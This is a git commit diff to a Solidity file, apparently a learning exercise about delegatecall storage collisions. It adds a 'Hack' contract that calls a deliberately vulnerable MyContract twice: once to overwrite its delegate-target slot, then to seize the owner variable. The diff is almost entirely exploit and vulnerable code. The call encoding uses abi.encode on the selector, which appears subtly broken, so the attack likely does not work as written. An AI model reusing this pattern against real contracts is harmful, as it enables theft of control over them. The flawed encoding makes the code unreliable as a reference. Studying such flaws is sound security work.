cd7a67546c81c862141ca00b2f6bd34dd75f1da7
MrNubOK <vadzim.shadryn@gmail.com>
2022-09-30 21:52:44 +0300

    delegate call issue

--- contracts/DelCall.sol
+++ contracts/DelCall.sol
@@ -2,19 +2,39 @@
 
 pragma solidity ^0.8.0;
 
-contract MyContract {
-    address public sender;
-    uint public value;
-    uint public at;
-    address secondContract;
+contract Hack {
+    MyContract public goal;
+    address public owner;
 
     constructor(address _address) {
+        goal = MyContract(_address);
+    }
+
+    function attack() external payable {
+        goal.delCallGetData(uint(uint160(address(this))));
+        goal.delCallGetData(0);
+    }
+
+    function getData() external payable {
+        owner = address(this);
+    }
+}
+
+contract MyContract {
+    address public secondContract;
+    address public owner;
+    uint public at;
+    address public sender;
+    uint public value;
+
+    constructor(address _address) {
+        owner = msg.sender;
         secondContract = _address;
     }
 
-    function delCallGetData() external payable {
+    function delCallGetData(uint timestamp) external payable {
         (bool success, ) = secondContract.delegatecall(
-            abi.encode(AnotherContract.getData.selector)
+            abi.encode(AnotherContract.getData.selector, timestamp)
         );
 
         require(success, "failed");
@@ -22,16 +42,16 @@ contract MyContract {
 }
 
 contract AnotherContract {
+    uint public at;
     address public sender;
     uint public value;
-    uint public at;
 
     event Received(address, uint);
 
-    function getData() external payable {
+    function getData(uint timestamp) external payable {
+        at = timestamp;
         sender = msg.sender;
         value = msg.value;
-        at = block.timestamp;
         emit Received(msg.sender, msg.value);
     }
 }
